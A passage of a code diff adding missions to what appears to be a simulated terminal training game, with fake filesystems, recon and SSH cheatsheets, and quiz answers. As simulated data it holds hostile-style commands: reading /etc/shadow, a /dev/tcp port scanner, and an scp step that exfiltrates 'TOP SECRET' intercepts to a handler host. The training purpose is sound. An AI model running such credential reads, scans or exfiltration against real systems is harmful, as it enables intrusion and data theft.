+                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'forensics',
+                    children: ['exfil_staging.tar.gz']
+                },
+                '/mnt/evidence/tmp/.hidden_cache/exfil_staging.tar.gz': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 52428800,
+                    content: '[LARGE FILE - 50MB]\nStaged for exfiltration\nContains classified documents'
+                },
             },
 
             objectives: [
-                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h', check: (cmd) => cmd.includes('df') },
-                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk', check: (cmd) => cmd.includes('lsblk') },
-                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*', check: (cmd) => cmd.includes('du') && cmd.includes('evidence') },
-                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f', check: (cmd) => cmd.includes('find') && cmd.includes('-size') },
-                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/', check: (cmd) => cmd.includes('grep') && cmd.includes('evidence') },
+                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h',
+                  check: (cmd, state, output) => cmd.includes('df') &&
+                         output && (output.includes('Filesystem') || output.includes('Size') || output.includes('/dev')) },
+                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk',
+                  check: (cmd, state, output) => cmd.includes('lsblk') &&
+                         output && (output.includes('NAME') || output.includes('disk') || output.includes('sda')) },
+                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*',
+                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('evidence') &&
+                         output && (/\d/.test(output) || output.includes('home') || output.includes('var')) },
+                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f',
+                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-size') &&
+                         output && (output.includes('/mnt') || output.includes('evidence') || output.includes('No matches')) },
+                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/',
+                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('evidence') &&
+                         output && (output.includes('DELETED') || output.includes('confidential') || output.includes('No matches')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the case officer's codename for case 2024-001?",
+                acceptedAnswers: ["specter", "SPECTER", "case officer specter"],
+                hint: "Check the notes.txt file in the case_2024_001 directory.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Case officer not recognized. Review the case notes.",
+                correctAnswerMessage: "CASE OFFICER SPECTER CONFIRMED. Evidence analysis authorized."
+            },
 
             remoteHosts: null,
         },
@@ -4086,11 +5127,96 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/auditor': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
-                    children: ['audit_logs', 'reports', '.bashrc']
+                    children: ['audit_logs', 'reports', 'notes', '.bash_history', '.user_recon_cheatsheet']
+                },
+                '/home/auditor/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'auditor', group: 'auditor', size: 234,
+                    content: `whoami
+id
+cat /etc/passwd
+grep sudo /etc/group
+last
+cat /etc/sudoers
+sudo -l`
+                },
+                '/home/auditor/.user_recon_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 856,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          USER RECONNAISSANCE CHEATSHEET                       ║
+╚═══════════════════════════════════════════════════════════════╝
+
+IDENTITY
+────────
+whoami                      Current username
+id                          UID, GID, and groups
+hostname                    System hostname
+uname -a                    Full system info
+
+USER ENUMERATION
+───────────────
+cat /etc/passwd             All user accounts
+cat /etc/shadow             Password hashes (need root)
+cat /etc/group              All groups
+getent passwd username      Specific user details
+
+PRIVILEGE ANALYSIS
+─────────────────
+grep sudo /etc/group        Users in sudo group
+cat /etc/sudoers            Sudo configuration
+sudo -l                     Current user's sudo rights
+find / -perm -4000          SUID binaries
+
+LOGIN HISTORY
+────────────
+last                        Recent logins
+lastlog                     Last login per user
+who                         Currently logged in
+w                           Logged in + activity
+
+SUSPICIOUS INDICATORS
+────────────────────
+- New users created recently
+- Users added to sudo/admin groups
+- Users with UID 0 (root equivalent)
+- Users with /bin/bash shell`
                 },
                 '/home/auditor/audit_logs': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
-                    children: ['user_activity.log']
+                    children: ['user_activity.log', 'privilege_changes.log']
+                },
+                '/home/auditor/audit_logs/user_activity.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 567,
+                    content: `2024-01-14 02:30:15 admin logged in from 192.168.1.100
+2024-01-14 02:31:00 admin executed: sudo useradd -m backdoor
+2024-01-14 02:31:30 admin executed: sudo passwd backdoor
+2024-01-14 02:32:00 admin executed: sudo usermod -aG sudo backdoor
+2024-01-14 03:00:00 backdoor logged in from 10.0.0.88
+2024-01-14 03:00:30 backdoor executed: sudo -i`
+                },
+                '/home/auditor/audit_logs/privilege_changes.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 345,
+                    content: `PRIVILEGE ESCALATION EVENTS
+============================
+2024-01-14 02:32:00 USER backdoor ADDED TO GROUP sudo BY admin
+2024-01-14 03:00:30 USER backdoor GAINED ROOT SHELL
+
+ALERT: Unauthorized privilege escalation detected!`
+                },
+                '/home/auditor/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
+                    children: ['template.txt']
+                },
+                '/home/auditor/reports/template.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 234,
+                    content: 'USER AUDIT REPORT\n=================\nDate: \nAuditor: \nFindings:\n\nSuspicious Accounts:\n\nRecommendations:\n'
+                },
+                '/home/auditor/notes': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
+                    children: ['investigation.txt']
+                },
+                '/home/auditor/notes/investigation.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 378,
+                    content: 'INVESTIGATION NOTES\n===================\nSuspect Account: backdoor\nCreated: 2024-01-14 02:31:00\nCreated By: admin (compromised?)\nPrivileges: sudo group member\nFirst Login: 2024-01-14 03:00:00 from 10.0.0.88\n\nACTION REQUIRED: Disable account and investigate admin'
                 },
                 '/home/admin': {
                     type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
@@ -4098,25 +5224,85 @@ find / -mtime -1 -type f 2>/dev/null`
                 },
                 '/home/admin/.bash_history': {
                     type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 1024,
-                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\n'
+                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\nhistory -c'
+                },
+                '/home/admin/.ssh': {
+                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
+                    children: ['authorized_keys']
+                },
+                '/home/admin/.ssh/authorized_keys': {
+                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 512,
+                    content: '# Authorized keys for admin\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... admin@workstation\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... UNKNOWN@10.0.0.88  # SUSPICIOUS'
+                },
+                '/home/admin/scripts': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
+                    children: ['backup.sh']
+                },
+                '/home/admin/scripts/backup.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
+                    content: '#!/bin/bash\n# System backup script\ntar -czf /backup/system_$(date +%Y%m%d).tar.gz /etc /home'
                 },
                 '/home/sysadmin': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
-                    children: ['.ssh', 'maintenance']
+                    children: ['.ssh', 'maintenance', '.bash_history']
+                },
+                '/home/sysadmin/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'sysadmin', group: 'sysadmin', size: 178,
+                    content: 'systemctl status sshd\njournalctl -u sshd\ncat /var/log/auth.log'
+                },
+                '/home/sysadmin/maintenance': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
+                    children: ['health_check.sh']
+                },
+                '/home/sysadmin/maintenance/health_check.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'sysadmin', group: 'sysadmin', size: 312,
+                    content: '#!/bin/bash\necho "=== SYSTEM HEALTH ==="\nuptime\nfree -h\ndf -h'
                 },
                 '/home/backdoor': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
-                    children: ['.bashrc', 'tools']
+                    children: ['.bashrc', 'tools', '.bash_history']
+                },
+                '/home/backdoor/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'backdoor', group: 'backdoor', size: 456,
+                    content: 'sudo -i\ncat /etc/shadow\nwhoami\nid\ncat /etc/passwd | grep root'
+                },
+                '/home/backdoor/tools': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
+                    children: ['enum.sh']
+                },
+                '/home/backdoor/tools/enum.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'backdoor', group: 'backdoor', size: 289,
+                    content: '#!/bin/bash\n# User enumeration script\necho "=== USERS ==="\ncat /etc/passwd\necho "=== SUDO USERS ==="\ngrep sudo /etc/group'
                 },
             },
 
             objectives: [
-                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id', check: (cmd) => cmd.includes('whoami') || cmd.includes('id') },
-                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd', check: (cmd) => cmd.includes('cat') && cmd.includes('passwd') },
-                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group', check: (cmd) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) },
-                { id: 4, task: 'CHECK: Login History', hint: '$ last', check: (cmd) => cmd.includes('last') || cmd.includes('lastlog') },
-                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l', check: (cmd) => cmd.includes('sudoers') || cmd.includes('sudo -l') },
+                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id',
+                  check: (cmd, state, output) => (cmd.includes('whoami') || cmd.includes('id')) &&
+                         output && (output.includes('auditor') || output.includes('uid=')) },
+                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd',
+                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('passwd') &&
+                         output && (output.includes('root') || output.includes('/bin/bash') || output.includes(':x:')) },
+                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group',
+                  check: (cmd, state, output) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) &&
+                         output && (output.includes('sudo') || output.includes('backdoor') || output.includes('admin')) },
+                { id: 4, task: 'CHECK: Login History', hint: '$ last',
+                  check: (cmd, state, output) => (cmd.includes('last')) &&
+                         output && (output.includes('pts') || output.includes('logged') || output.includes('still')) },
+                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l',
+                  check: (cmd, state, output) => (cmd.includes('sudoers') || cmd.includes('sudo -l')) &&
+                         output && (output.includes('ALL') || output.includes('NOPASSWD') || output.includes('sudo')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the username of the suspicious account created by the attacker?",
+                acceptedAnswers: ["backdoor", "user backdoor", "backdoor user"],
+                hint: "Check the audit_logs directory or admin's bash_history for recently created accounts.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Account not found. Review the privilege_changes.log or user_activity.log.",
+                correctAnswerMessage: "BACKDOOR ACCOUNT IDENTIFIED. Recommend immediate disablement."
+            },
 
             remoteHosts: null,
         },
@@ -4138,37 +5324,149 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/operator': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
-                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', '.bashrc']
+                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', 'staging', '.bash_history', '.ssh_cheatsheet']
+                },
+                '/home/operator/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 312,
+                    content: `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
+ls -la ~/.ssh/
+cat ~/.ssh/config
+ssh -T relay
+scp file.tar.gz user@host:/path/
+ssh -L 8080:localhost:80 relay`
+                },
+                '/home/operator/.ssh_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 945,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          SSH OPERATIONS CHEATSHEET                            ║
+╚═══════════════════════════════════════════════════════════════╝
+
+KEY GENERATION
+─────────────
+ssh-keygen -t ed25519           Generate Ed25519 key (recommended)
+ssh-keygen -t rsa -b 4096       Generate RSA 4096-bit key
+ssh-keygen -f ~/.ssh/mykey      Specify key filename
+ssh-keygen -p -f keyfile        Change passphrase
+
+KEY MANAGEMENT
+─────────────
+ls -la ~/.ssh/                  List SSH directory
+cat ~/.ssh/id_ed25519.pub       View public key
+chmod 600 ~/.ssh/id_*           Fix key permissions
+ssh-copy-id user@host           Deploy public key
+
+CONNECTION
+─────────
+ssh user@host                   Basic connection
+ssh -i keyfile user@host        Specify identity file
+ssh -p 2222 user@host           Non-standard port
+ssh -T host                     Test connection (no TTY)
+
+FILE TRANSFER
+────────────
+scp file user@host:/path/       Copy to remote
+scp user@host:/path/file .      Copy from remote
+scp -r dir/ user@host:/path/    Recursive copy
+rsync -avz dir/ user@host:/p/   Sync with progress
+
+TUNNELING
+────────
+ssh -L 8080:localhost:80 host   Local port forward
+ssh -R 8080:localhost:80 host   Remote port forward
+ssh -D 1080 host                SOCKS proxy`
                 },
                 '/home/operator/.ssh': {
                     type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
-                    children: ['known_hosts', 'config']
+                    children: ['known_hosts', 'config', 'authorized_keys']
                 },
                 '/home/operator/.ssh/known_hosts': {
                     type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
-                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
+                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]\nbackup.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
                 },
                 '/home/operator/.ssh/config': {
-                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 128,
-                    content: 'Host relay\n    HostName relay.langley.gov\n    User handler\n    IdentityFile ~/.ssh/id_ed25519\n'
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
+                    content: `# SSH Configuration for OPERATION SILENT RELAY
+Host relay
+    HostName relay.langley.gov
+    User handler
+    IdentityFile ~/.ssh/id_ed25519
+    Port 22
+
+Host backup
+    HostName backup.langley.gov
+    User handler
+    IdentityFile ~/.ssh/id_ed25519`
+                },
+                '/home/operator/.ssh/authorized_keys': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 178,
+                    content: '# Handler public keys\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5... handler@langley'
                 },
                 '/home/operator/mission_brief.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
-                    content: 'OPERATION SILENT RELAY\n======================\nObjective: Exfiltrate UMBRA intercepts via SSH tunnel\nHandler: RAVEN-7 @ relay.langley.gov\nProtocol: Generate key, deploy, establish tunnel\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 678,
+                    content: `OPERATION SILENT RELAY
+======================
+Classification: TOP SECRET
+
+Objective: Exfiltrate UMBRA intercepts via SSH tunnel
+
+Handler: RAVEN-7 @ relay.langley.gov
+Backup: RAVEN-7 @ backup.langley.gov
+
+Protocol:
+1. Generate Ed25519 key pair
+2. Verify key in .ssh directory
+3. Review SSH config for relay host
+4. Test connection to relay
+5. Secure copy package to handler
+
+CODENAME: SILENT RELAY
+STATUS: ACTIVE`
                 },
                 '/home/operator/UMBRA_intercepts.tar.gz': {
                     type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 2516582,
-                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]'
+                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]\nEncrypted package ready for exfiltration\nSHA256: a3b4c5d6e7f8...'
+                },
+                '/home/operator/staging': {
+                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
+                    children: ['manifest.txt', 'transfer_log.txt']
+                },
+                '/home/operator/staging/manifest.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 234,
+                    content: 'EXFIL MANIFEST\n==============\nPackage: UMBRA_intercepts.tar.gz\nSize: 2.5MB\nClassification: TOP SECRET//UMBRA//NOFORN\nDestination: relay.langley.gov'
+                },
+                '/home/operator/staging/transfer_log.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 189,
+                    content: 'TRANSFER LOG\n============\nPending transfers:\n- UMBRA_intercepts.tar.gz -> relay\n\nCompleted transfers:\n[none]'
                 },
             },
 
             objectives: [
-                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519', check: (cmd) => cmd.includes('ssh-keygen') },
-                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/', check: (cmd) => cmd.includes('ls') && cmd.includes('.ssh') },
-                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config', check: (cmd) => cmd.includes('cat') && cmd.includes('config') },
-                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)', check: (cmd) => cmd.includes('ssh') && !cmd.includes('keygen') },
-                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:', check: (cmd) => cmd.includes('scp') || cmd.includes('rsync') },
+                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519',
+                  check: (cmd, state, output) => cmd.includes('ssh-keygen') &&
+                         output && (output.includes('Generating') || output.includes('created') || output.includes('id_ed25519')) },
+                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/',
+                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('.ssh') &&
+                         output && (output.includes('id_') || output.includes('config') || output.includes('known_hosts')) },
+                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config',
+                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('config') &&
+                         output && (output.includes('Host') || output.includes('relay') || output.includes('HostName')) },
+                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)',
+                  check: (cmd, state, output) => cmd.includes('ssh') && !cmd.includes('keygen') &&
+                         output && (output.includes('connected') || output.includes('relay') || output.includes('authenticated')) },
+                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:',
+                  check: (cmd, state, output) => (cmd.includes('scp') || cmd.includes('rsync')) &&
+                         output && (output.includes('transfer') || output.includes('100%') || output.includes('UMBRA')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the operation codename for this SSH exfiltration mission?",
+                acceptedAnswers: ["silent relay", "SILENT RELAY", "operation silent relay"],
+                hint: "Check the mission_brief.txt file for the operation codename.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Operation codename not recognized. Review mission briefing.",
+                correctAnswerMessage: "OPERATION SILENT RELAY CONFIRMED. Secure channel established."
+            },
 
             remoteHosts: null,
         },
@@ -4190,33 +5488,181 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/recon': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
-                    children: ['scans', 'notes', 'tools', '.bashrc']
+                    children: ['scans', 'notes', 'tools', 'reports', '.bash_history', '.network_recon_cheatsheet']
+                },
+                '/home/recon/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'recon', group: 'recon', size: 278,
+                    content: `ip addr
+ip route
+ss -tuln
+cat /etc/resolv.conf
+ping -c 3 192.168.1.1
+netstat -rn
+traceroute 10.0.0.1`
+                },
+                '/home/recon/.network_recon_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 967,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          NETWORK RECONNAISSANCE CHEATSHEET                    ║
+╚═══════════════════════════════════════════════════════════════╝
+
+INTERFACE ENUMERATION
+────────────────────
+ip addr                     List all interfaces with IPs
+ip link                     List interfaces (link layer)
+ifconfig                    Legacy interface listing
+hostname -I                 Quick IP listing
+
+ROUTING
+──────
+ip route                    Show routing table
+ip route get 8.8.8.8        Find route to specific host
+netstat -rn                 Legacy routing table
+route -n                    Alternative routing view
+
+PORT SCANNING
+────────────
+ss -tuln                    TCP/UDP listening ports
+ss -tulnp                   With process names (needs root)
+netstat -tuln               Legacy port listing
+lsof -i :80                 What's using port 80?
+
+DNS CONFIGURATION
+────────────────
+cat /etc/resolv.conf        DNS servers
+cat /etc/hosts              Local hostname mappings
+nslookup hostname           DNS lookup
+dig hostname                Detailed DNS query
+
+CONNECTIVITY TESTING
+───────────────────
+ping -c 3 host              ICMP echo test
+traceroute host             Path to destination
+mtr host                    Combined ping/traceroute
+curl -I http://host         HTTP connectivity
+
+TARGET DISCOVERY (10.0.0.66)
+───────────────────────────
+Gateway: 10.0.0.1
+DNS: 10.0.0.2
+Target Server: 10.0.0.66 (HIGH VALUE)`
                 },
                 '/home/recon/scans': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
-                    children: ['initial_sweep.txt', 'port_scan.txt']
+                    children: ['initial_sweep.txt', 'port_scan.txt', 'service_enum.txt']
                 },
                 '/home/recon/scans/initial_sweep.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 512,
-                    content: 'NETWORK SWEEP RESULTS\n=====================\n192.168.1.0/24 - Corporate LAN\n10.0.0.0/8 - Internal Services\n172.16.0.0/16 - DMZ\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 678,
+                    content: `NETWORK SWEEP RESULTS
+=====================
+Date: 2024-01-15 02:00 UTC
+Operator: recon
+
+DISCOVERED NETWORKS
+───────────────────
+192.168.1.0/24 - Corporate LAN (user workstations)
+10.0.0.0/8 - Internal Services (servers, databases)
+172.16.0.0/16 - DMZ (web servers, mail)
+
+HIGH VALUE TARGETS
+─────────────────
+10.0.0.66 - Database server (MySQL 3306)
+10.0.0.88 - File server (SMB 445)
+172.16.0.10 - Web server (HTTP 80, HTTPS 443)`
+                },
+                '/home/recon/scans/port_scan.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 456,
+                    content: `PORT SCAN RESULTS - 10.0.0.66
+==============================
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+
+NOTES: Database server - primary exfil target`
+                },
+                '/home/recon/scans/service_enum.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
+                    content: `SERVICE ENUMERATION
+===================
+SSH: OpenSSH 8.4
+HTTP: Apache 2.4.41
+MySQL: 5.7.32
+OS: Ubuntu 20.04 LTS`
                 },
                 '/home/recon/notes': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
-                    children: ['targets.txt']
+                    children: ['targets.txt', 'mission.txt']
+                },
+                '/home/recon/notes/targets.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
+                    content: `PRIORITY TARGETS
+================
+1. 10.0.0.66 - Database (contains user data)
+2. 10.0.0.88 - File server (contains backups)
+3. 172.16.0.10 - Web server (entry point)
+
+CODENAME: OUTPOST-7
+PRIMARY TARGET IP: 10.0.0.66`
+                },
+                '/home/recon/notes/mission.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 289,
+                    content: `MISSION: NETWORK MAPPING
+========================
+Objective: Map internal network from compromised outpost
+Priority: Identify database server for data extraction
+Report findings to handler before proceeding`
                 },
                 '/home/recon/tools': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
-                    children: ['scanner.sh']
+                    children: ['scanner.sh', 'port_check.sh']
+                },
+                '/home/recon/tools/scanner.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 234,
+                    content: '#!/bin/bash\n# Network scanner\necho "=== INTERFACES ==="\nip addr\necho "=== ROUTES ==="\nip route\necho "=== LISTENING PORTS ==="\nss -tuln'
+                },
+                '/home/recon/tools/port_check.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 178,
+                    content: '#!/bin/bash\n# Quick port check\necho "Checking common ports on $1"\nfor port in 22 80 443 3306; do\n  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "$port open"\ndone'
+                },
+                '/home/recon/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
+                    children: ['template.txt']
+                },
+                '/home/recon/reports/template.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 234,
+                    content: 'NETWORK RECON REPORT\n====================\nDate: \nOperator: \nNetwork Ranges: \nKey Targets: \nRecommendations: \n'
                 },
             },
 
             objectives: [
-                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)', check: (cmd) => cmd.includes('ip ') || cmd.includes('ifconfig') },
-                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)', check: (cmd) => cmd.includes('route') || cmd.includes('netstat') },
-                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)', check: (cmd) => cmd.includes('ss ') || (cmd.includes('netstat') && cmd.includes('-')) },
-                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf', check: (cmd) => cmd.includes('resolv') },
-                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1', check: (cmd) => cmd.includes('ping') || cmd.includes('traceroute') },
+                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)',
+                  check: (cmd, state, output) => (cmd.includes('ip addr') || cmd.includes('ip a') || cmd.includes('ifconfig')) &&
+                         output && (output.includes('inet') || output.includes('eth') || output.includes('lo')) },
+                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)',
+                  check: (cmd, state, output) => (cmd.includes('route') || cmd.includes('netstat')) &&
+                         output && (output.includes('default') || output.includes('Gateway') || output.includes('via')) },
+                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)',
+                  check: (cmd, state, output) => (cmd.includes('ss') || (cmd.includes('netstat') && cmd.includes('-'))) &&
+                         output && (output.includes('LISTEN') || output.includes('State') || output.includes(':22') || output.includes(':80')) },
+                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf',
+                  check: (cmd, state, output) => cmd.includes('resolv') &&
+                         output && (output.includes('nameserver') || output.includes('search') || output.includes('dns')) },
+                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1',
+                  check: (cmd, state, output) => (cmd.includes('ping') || cmd.includes('traceroute')) &&
+                         output && (output.includes('bytes') || output.includes('icmp') || output.includes('ttl') || output.includes('hop')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the IP address of the primary target (database server)?",
+                acceptedAnswers: ["10.0.0.66", "10.0.0.66/32", "ip 10.0.0.66"],
+                hint: "Check the targets.txt in the notes directory or the initial_sweep.txt scan results.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Target IP not confirmed. Review scan results and target notes.",
+                correctAnswerMessage: "TARGET 10.0.0.66 CONFIRMED. Database server identified for extraction."
+            },
 
             remoteHosts: null,
         },
@@ -4238,25 +5684,149 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/analyst': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['analysis', 'reports', '.bashrc']
+                    children: ['analysis', 'reports', 'scripts', '.bash_history', '.systemctl_cheatsheet']
+                },
+                '/home/analyst/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
+                    content: `systemctl list-units --type=service
+systemctl status sshd
+systemctl cat sshd
+systemctl --failed
+systemctl list-unit-files --state=enabled
+journalctl -u sshd -n 50`
+                },
+                '/home/analyst/.systemctl_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 945,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          SERVICE MANAGEMENT CHEATSHEET                        ║
+╚═══════════════════════════════════════════════════════════════╝
+
+SERVICE LISTING
+──────────────
+systemctl list-units --type=service    Running services
+systemctl list-units --all             All units (including inactive)
+systemctl list-unit-files              All installed unit files
+systemctl list-unit-files --state=enabled  Enabled services
+
